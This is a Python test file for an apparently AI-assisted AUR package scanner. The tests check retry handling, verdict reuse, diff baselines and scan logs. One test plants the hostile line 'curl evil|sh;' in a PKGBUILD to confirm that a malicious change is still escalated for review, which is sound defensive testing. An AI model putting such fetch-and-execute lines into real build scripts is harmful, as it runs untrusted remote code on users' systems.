"""Scan-phase state handling: retries, reuse, and the diff baseline."""
from pathlib import Path

from aurmirror import scan
from aurmirror.recipe import RecipeText
from aurmirror.review import transient

PB = "pkgname=x\npkgver=1\npkgrel=1\nbuild(){ :; }\n"


class ScriptedReviewer:
    """Reviewer stand-in returning scripted verdicts and recording lanes."""

    def __init__(self, *verdicts):
        self.verdicts = list(verdicts)
        self.lanes = []
        self.tripped = ""

    def quick(self, _pkg: str, _recipe: RecipeText) -> dict:
        """Haiku lane."""
        self.lanes.append("haiku")
        return self.verdicts.pop(0)

    def escalated(self, _pkg: str, _recipe: RecipeText, _diff) -> dict:
        """Escalated lane."""
        self.lanes.append("escalated")
        return self.verdicts.pop(0)


PASS = {"safe": True, "risk": "low", "summary": "ok"}
FAIL = {"safe": False, "risk": "high", "summary": "bad"}


def _ctx(dirs: Path, reviewer) -> scan.ScanContext:
    work = dirs / "work"
    work.mkdir(exist_ok=True)
    return scan.ScanContext(state={}, meta={}, reviewer=reviewer, workdir=work)


def test_error_state_keeps_prior_pass():
    """A transient error never demotes a passing package."""
    prev = {"commit": "c1", "verdict": "pass", "risk": "low"}
    got = scan.error_state(prev, "boom")
    assert got["verdict"] == "pass" and got["commit"] == "c1" and got["last_error"] == "boom"


def test_error_state_without_pass_is_retryable():
    """With no prior pass the entry is an error with no commit."""
    got = scan.error_state({"verdict": "fail", "last_pass_commit": "c0"}, "boom")
    assert got["verdict"] == "error" and got["commit"] == "" and got["last_pass_commit"] == "c0"


def test_reusable_rejects_errors():
    """Outage-era records (fail + risk error) and error verdicts are rescanned."""
    assert scan.reusable({"commit": "h", "verdict": "pass", "risk": "low"}, "h")
    assert not scan.reusable({"commit": "h", "verdict": "fail", "risk": "error"}, "h")
    assert not scan.reusable({"commit": "h", "verdict": "error", "risk": "error"}, "h")
    assert not scan.reusable({"commit": "old", "verdict": "pass", "risk": "low"}, "h")


def test_diff_base_never_uses_failed_commit():
    """The baseline is the last passing commit."""
    failed = {"commit": "bad", "verdict": "fail", "last_pass_commit": "good"}
    assert scan.diff_base(failed) == "good"
    assert scan.diff_base({"commit": "bad", "verdict": "fail"}) == ""
    assert scan.diff_base({"commit": "ok", "verdict": "pass"}) == "ok"


def test_transient_verdict_is_retried(dirs, make_repo):
    """An API error is stored as a retryable error, then rescanned next run."""
    repo = make_repo()
    repo.commit({"PKGBUILD": PB})
    entry = {"name": "x", "source": str(repo.path)}
    ctx = _ctx(dirs, ScriptedReviewer(transient("credit"), PASS))
    assert scan.scan_entry(entry, ctx) == "error"
    assert ctx.state["x"]["verdict"] == "error" and ctx.state["x"]["commit"] == ""
    ctx.owners.clear()
    assert scan.scan_entry(entry, ctx) == "scanned"
    assert ctx.state["x"]["verdict"] == "pass"


def test_failed_commit_cannot_launder_change(dirs, make_repo):
    """After a substantive commit fails, a later version-only bump still escalates."""
    repo = make_repo()
    good = repo.commit({"PKGBUILD": PB})
    entry = {"name": "x", "source": str(repo.path)}
    reviewer = ScriptedReviewer(PASS, FAIL, PASS)
    ctx = _ctx(dirs, reviewer)
    scan.scan_entry(entry, ctx)
    repo.commit({"PKGBUILD": PB.replace(":;", "curl evil|sh;")})
    ctx.owners.clear()
    scan.scan_entry(entry, ctx)
    assert ctx.state["x"]["verdict"] == "fail" and ctx.state["x"]["last_pass_commit"] == good
    repo.commit({"PKGBUILD": PB.replace(":;", "curl evil|sh;").replace("pkgver=1", "pkgver=2")})
    ctx.owners.clear()
    scan.scan_entry(entry, ctx)
    assert reviewer.lanes == ["escalated", "escalated", "escalated"]


def test_unchanged_head_reuses_verdict(dirs, make_repo):
    """A real verdict at the same commit is not re-reviewed."""
    repo = make_repo()
    repo.commit({"PKGBUILD": PB})
    entry = {"name": "x", "source": str(repo.path)}
    ctx = _ctx(dirs, ScriptedReviewer(PASS))
    scan.scan_entry(entry, ctx)
    ctx.owners.clear()
    assert scan.scan_entry(entry, ctx) == "reused"


def test_scan_log_written(dirs, make_repo):
    """Each reviewed package gets a public scan log."""
    repo = make_repo()
    repo.commit({"PKGBUILD": PB})
    ctx = _ctx(dirs, ScriptedReviewer(PASS))
    scan.scan_entry({"name": "x", "source": str(repo.path)}, ctx)
    assert ctx.logs["x"] == "/status/logs/run-1/x.scan.log"
    assert "verdict:  pass" in (dirs / "status_dir/logs/run-1/x.scan.log").read_text(
        encoding="utf-8")
